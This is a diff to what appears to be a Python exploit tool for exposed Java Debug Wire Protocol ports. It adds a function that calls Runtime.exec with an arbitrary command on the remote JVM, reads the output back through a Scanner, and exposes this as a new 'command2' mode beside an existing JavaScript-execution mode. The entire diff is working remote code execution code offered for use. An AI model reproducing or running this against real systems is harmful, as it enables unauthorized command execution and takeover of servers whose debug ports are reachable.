@@ -570,6 +570,45 @@ def runtime_exec(jdwp, cmd):
         print(e.message)
         jdwp.resumevm()
 
+def runtime_exec_2(jdwp, cmd):
+    try:
+        thread_id = get_thread_id(jdwp)
+
+
+        runtime_class_id = get_class_id(jdwp, "Ljava/lang/Runtime;")
+        print ("[+] Found Runtime class: {:#x}".format(runtime_class_id))
+        getRuntime_method_id = get_method_id(jdwp, runtime_class_id, "getRuntime", "()Ljava/lang/Runtime;")
+        print ("[+] Found Runtime.getRuntime(): {:#x}".format(getRuntime_method_id))
+        string_id = get_string_id(jdwp, cmd)
+        print ("[+] Command string created: {:#x}, command: {}".format(string_id, cmd))
+        runtime_object_id = invoke_static_object(jdwp, thread_id, runtime_class_id, getRuntime_method_id, None)
+        print ("[+] Runtime.getRuntime() returned context: {:#x}".format(runtime_object_id))
+        exec_method_id = get_method_id(jdwp, runtime_class_id, "exec", "(Ljava/lang/String;)Ljava/lang/Process;")
+        print ("[+] found Runtime.exec(): {:#x}".format(exec_method_id))
+        retId = invoke_object(jdwp, thread_id, runtime_class_id, runtime_object_id, exec_method_id, string_id)
+        print ("[+] Runtime.exec() successful, retId: {:#x} ".format(retId))
+
+
+        process_class_id = get_class_id(jdwp, "Ljava/lang/Process;")
+        process_getInputStream_method_id = get_method_id(jdwp, process_class_id, "getInputStream", "()Ljava/io/InputStream;")
+        inputStream_object_id = invoke_object(jdwp, thread_id, process_class_id, retId, process_getInputStream_method_id, None)
+
+        scanner_class_id = get_class_id(jdwp, "Ljava/util/Scanner;")
+        scanner_init_method_id = get_method_id(jdwp, scanner_class_id, "<init>", "(Ljava/io/InputStream;)V")
+        scanner_object_id = new_instance(jdwp, thread_id, scanner_class_id, scanner_init_method_id, inputStream_object_id )
+
+        scanner_useDelimiter_method_id = get_method_id(jdwp, scanner_class_id, "useDelimiter", "(Ljava/lang/String;)Ljava/util/Scanner;")
+        scanner_object_id_2 = invoke_object(jdwp, thread_id, scanner_class_id, scanner_object_id, scanner_useDelimiter_method_id, get_string_id(jdwp,"\\z"))
+
+        scanner_next_method_id = get_method_id(jdwp, scanner_class_id, "next", "()Ljava/lang/String;")
+        result_string = invoke_string(jdwp, thread_id, scanner_class_id, scanner_object_id_2, scanner_next_method_id, None)
+        res = jdwp.solve_string(jdwp.format(jdwp.objectIDSize, result_string))
+
+        return res
+    except Exception as e:
+        print(e.message)
+        jdwp.resumevm()
+
 
 def run_js_code(jdwp, code):
     code = '''
@@ -668,11 +707,19 @@ if __name__ == "__main__":
             print("[-] \n{}\n".format(res))
         else:
             print("[+] success")
-    else:
+    elif args.m == "command2":
+        if not args.c or args.c.strip() == "":
+            print("[-] Command cannot be empty")
+            exit(0)
+        res = runtime_exec_2(client, args.c)
+        print("[+] Run Command Result:\n\n{}\n".format(res))
+    elif args.m == "code":
         if not args.c or args.c.strip() == "":
             print("[-] Code cannot be empty")
             exit(0)
         res = run_js_code(client, args.c)
         print("[+] Run JS Code Result:\n\n{}\n".format(res))
+    else:
+        print("[+] Error. No: {}".format(args.m))
 
     client.leave()
